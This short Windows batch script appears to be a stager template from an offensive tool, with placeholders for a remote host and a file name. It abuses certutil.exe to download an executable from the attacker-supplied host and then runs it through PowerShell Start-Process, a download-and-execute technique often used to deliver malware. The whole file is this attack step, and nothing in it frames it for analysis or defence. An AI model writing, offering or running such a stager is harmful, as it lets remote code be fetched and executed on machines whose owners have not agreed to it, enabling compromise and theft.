@echo off
setlocal ENABLEDELAYEDEXPANSION
set "line={line}" 
set "lhost={lhost}"
set "SOURCE_FILE=%line%.exe"
certutil.exe -urlcache -split -f http://{lhost}/{line}.exe {line}.exe
powershell Start-Process -FilePath "%SOURCE_FILE%"
